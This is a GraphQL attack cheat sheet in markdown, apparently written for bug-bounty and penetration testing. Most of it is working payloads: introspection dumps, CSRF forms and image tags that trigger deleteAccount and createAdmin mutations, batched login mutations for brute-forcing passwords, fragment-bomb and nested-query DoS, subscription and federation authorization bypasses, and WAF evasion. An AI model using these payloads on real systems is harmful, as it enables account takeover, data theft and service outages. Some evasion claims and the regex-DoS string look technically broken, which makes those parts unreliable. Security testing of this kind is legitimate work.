---
tags:
  - critical
  - server-side
---

# GraphQL Attacks

## TL;DR

GraphQL exposes rich attack surface: introspection for schema discovery, batch queries for rate limit bypass, nested queries for DoS, and authorization bypasses.

**Check WebSocket endpoints when HTTP introspection is disabled.**

## Detection

### Identify Endpoints

```
/graphql
/api/graphql
/query
/v1/graphql
/graphql/console
```

### Check Introspection

```graphql
query { __schema { types { name } } }
```

If returns schema → introspection enabled.

## Exploitation

### Introspection

**Full Schema Dump:**
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types { 
      kind name description
      fields(includeDeprecated: true) {
        name type { kind name }
      }
    }
  }
}
```

**Deprecated fields often still work:**
```graphql
query {
  team(handle:"security") {
    id _id bug_count sla_failed_count
  }
}
```

### Authorization Bypasses

**CSRF via GET:**
```html
<form action="https://target.com/api/graphql/" method="GET">
  <input name="query" value="mutation { createSnippet(...) }">
</form>
<script>document.forms[0].submit()</script>
```

**Cross-Scope Data Access:**
```graphql
# Access location data without permissions
query { locations { id address { address1 city } } }

# Extract API keys
query { publications(first: 100) { edges { node { app { apiKey } } } } }
```

### Batch Query Abuse

**Rate Limit Bypass:**
```graphql
mutation BulkReports($team: String!) {
  q0: createReport(input: {team_handle: $team}) { was_successful }
  q1: createReport(input: {team_handle: $team}) { was_successful }
  # ... repeat 75 times
}
```

**Query Alias Abuse:**
```graphql
query {
  user1: user(id: "1") { name email }
  user2: user(id: "2") { name email }
  user3: user(id: "3") { name email }
}
```

### DoS Attacks

**Circular Introspection:**
```graphql
query {
  __schema {
    types { fields { type { fields { type { fields { name } } } } } }
  }
}
```

**Regex DoS:**
```graphql
query {
  search(q: "[a-zA-Z0-9]+\\s?)+$|^([a-zA-Z0-9.'\\w\\W]+\\s?)+$\\") {
    _id
  }
}
```

**Field Explosion:**
```graphql
query {
  users { posts { comments { replies { user { posts { ... } } } } } }
}
```

### WebSocket Introspection Bypass

When HTTP disables introspection:
```javascript
ws = new WebSocket("wss://target.com/graphql");
ws.send(JSON.stringify({type: "connection_init"}));
ws.send(JSON.stringify({
  id: "1", 
  type: "start", 
  payload: {query: "{ __schema { types { name } } }"}
}));
```

## Bypasses

### Introspection Disabled

- Check WebSocket endpoint
- Use field suggestion errors
- Brute force common field names
- Check GraphiQL/Playground endpoints

### Authorization

- Test mutations via GET (CSRF bypass)
- Query deprecated fields
- Use relationships to pivot
- Check subscription permissions separately

## Real Examples

- **HackerOne #291531:** Full schema via introspection
- **HackerOne #862835:** WebSocket introspection bypass
- **HackerOne #1122408 (GitLab):** CSRF via GET mutations
- **HackerOne #984965 (TikTok):** Cross-tenant IDOR
- **HackerOne #1091303 (Shopify POS):** Manager PIN disclosure
- **HackerOne #2166697:** 75 reports per request batch abuse
- **HackerOne #2048725 (Sorare):** Circular introspection DoS

## Tools

```bash
# Quick introspection check
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}' \
  https://target.com/graphql

# Tools
- GraphQL Voyager (schema viz)
- InQL (Burp extension)
- graphql-cop (security auditor)
- Altair GraphQL Client
```

### Batch Generator

```python
def generate_batch(operation, count):
    queries = [f'q{i}: {operation}' for i in range(count)]
    return 'query Batch { ' + ' '.join(queries) + ' }'

print(generate_batch('user(id:"1"){name}', 100))
```

---

## Advanced GraphQL Techniques

### Implementation Fingerprinting

Identify the GraphQL implementation to know which protections are missing by default:

```bash
graphw00f -t https://target.com/graphql
```

**Security defaults by implementation:**

| Implementation | Field Suggestions | Depth Limit | Cost Analysis | Batch Requests |
|----------------|:-----------------:|:-----------:|:-------------:|:--------------:|
| Apollo | ✅ ON | ⚠️ off | ⚠️ off | ✅ ON |
| graphql-php | ✅ ON | ⚠️ off | ⚠️ off | ⚠️ off |
| wp-graphql | ✅ ON | ⚠️ off | ❌ none | ✅ ON |
| graphene (Python) | ✅ ON | ❌ none | ❌ none | ⚠️ off |
| graphql-ruby | ✅ ON | ⚠️ off | ⚠️ off | ✅ ON |
| gqlgen (Go) | ✅ ON | ❌ none | ⚠️ off | ⚠️ off |
| Tartiflette | ❌ none | ❌ none | ❌ none | ❌ none |

- **Apollo / wp-graphql / graphql-ruby** → test batching attacks first
- **graphene / gqlgen / Tartiflette** → no depth limit → nested DoS possible
- **Most implementations** → no cost analysis → resource exhaustion viable

### Mutation Auth Bypass via GET

Mutations triggered as GET requests bypass CSRF protection and some authorization middleware:

```html
<!-- CSRF via GET mutation (no state-changing verb required) -->
<img src="https://target.com/graphql?query=mutation{deleteAccount(id:1)}">

<form action="https://target.com/api/graphql/" method="GET">
  <input name="query" value="mutation { createAdmin(email: &quot;attacker@evil.com&quot;) { token } }">
</form>
<script>document.forms[0].submit()</script>
```

### Query Cost Exploitation

If the server has no cost analysis, exploit with expensive nested queries:

```graphql
# Fragment bomb — exponential expansion
fragment A on User { ...B ...B }
fragment B on User { ...C ...C }
fragment C on User { ...D ...D }
fragment D on User { id email role permissions { name } }

query Bomb { user(id: "1") { ...A } }
```

```graphql
# Deep nesting — hits N+1 query problem
query Deep {
  users {
    friends {
      friends {
        friends {
          friends {
            friends { id email }
          }
        }
      }
    }
  }
}
```

**Impact**: CPU/memory exhaustion → DoS. Even with depth limits, fragment bombs bypass them unless cost is calculated on expanded fragments.

### Alias-Based IDOR

Use aliases to access multiple objects in one request and compare owned vs. foreign:

```graphql
query {
  mine: user(id: "MY_ID") {
    id email role adminNotes
  }
  victim: user(id: "VICTIM_ID") {
    id email role adminNotes
  }
}
```

If `victim` returns data → IDOR confirmed. One request proves both access and impact.

### Batching for Rate Limit Bypass

Array-based batching (supported by Apollo, wp-graphql, graphql-ruby):

```json
[
  {"query": "mutation { login(email: \"admin@target.com\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(email: \"admin@target.com\", password: \"pass2\") { token } }"},
  {"query": "mutation { login(email: \"admin@target.com\", password: \"pass3\") { token } }"}
]
```

```python
# Batch generator
def generate_array_batch(email, passwords):
    return [
        {"query": f'mutation {{ login(email: "{email}", password: "{pw}") {{ token }} }}'}
        for pw in passwords
    ]
```

Alias-based batching (works on any implementation):

```graphql
mutation BulkLogin {
  a: login(email: "admin@target.com", password: "pass1") { token }
  b: login(email: "admin@target.com", password: "pass2") { token }
  c: login(email: "admin@target.com", password: "pass3") { token }
}
```

### Subscription Auth Bypass

Authorization is often checked only at WebSocket handshake, not per-message:

```graphql
# Subscribe to another user's events
subscription {
  orderUpdates(userId: "VICTIM_ID") {
    orderId status items { name price }
  }
}

# Cross-tenant via shared resolver
subscription {
  notifications(filter: { tenantId: "OTHER_TENANT_ID" }) {
    message data
  }
}
```

```javascript
// Subscribe via raw WebSocket when HTTP introspection is blocked
const ws = new WebSocket("wss://target.com/graphql");
ws.onopen = () => {
  ws.send(JSON.stringify({type: "connection_init", payload: {}}));
  ws.send(JSON.stringify({
    id: "1", type: "start",
    payload: { query: "subscription { orderUpdates(userId: \"VICTIM_ID\") { orderId status } }" }
  }));
};
ws.onmessage = (e) => console.log(e.data);
```

### Federation _entities Bypass

In GraphQL Federation, gateway applies auth but subgraphs may not:

```graphql
# Direct subgraph request (bypassing gateway auth)
query {
  _entities(representations: [
    { __typename: "User", id: "ADMIN_USER_ID" }
  ]) {
    ... on User {
      email
      role
      internalNotes
      paymentMethods { last4 }
    }
  }
}
```

```bash
# Identify subgraph endpoints (often on different ports/paths)
# Gateway: https://target.com/graphql
# Subgraph: https://target.com:4001/graphql (internal) or /api/users/graphql
```

### WAF Evasion

```graphql
# Fragment-based splitting (breaks WAF pattern "email")
fragment F on User { em }
query { user { ...F ail } }  # Concatenates to "email"

# Unicode escapes
query { user { \u0065mail } }  # \u0065 = 'e'

# Block string triple-quotes
query { user(id: """1""") { email } }

# GET request (avoids POST body inspection)
GET /graphql?query={user(id:"1"){email}}

# Newline in introspection query (breaks regex matching)
GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

### @defer Directive — Gated Field Bypass

```graphql
# Gated fields may leak via incremental delivery
query {
  me { id username }
  ... @defer {
    adminPanel { secretConfig apiKeys }
  }
}
```

Check if `@defer` is supported (`apollo-require-preflight` header may be required).

### Relay Node ID Decoding

```bash
# Decode base64 global IDs
echo "VXNlcjoxMjM=" | base64 -d
# → User:123

# Query by decoded ID
query {
  node(id: "VXNlcjoxMjM=") {
    ... on User { email role internalId }
    ... on Order { total status items }
  }
}
```

### Advanced Checklist

- [ ] Fingerprint GraphQL implementation with graphw00f
- [ ] Test batching (array + alias) for rate limit bypass
- [ ] Test alias IDOR (own vs foreign objects in one query)
- [ ] Test mutations via GET (CSRF bypass)
- [ ] Test subscription auth (per-message vs handshake-only)
- [ ] Attempt query cost exhaustion (fragment bomb, deep nesting)
- [ ] Test `_entities` on federation subgraph endpoints directly
- [ ] Decode Relay node IDs and enumerate objects
- [ ] Test `@defer` and `@stream` for gated field leakage
- [ ] Apply WAF evasion (fragment split, unicode escape, GET, newline)
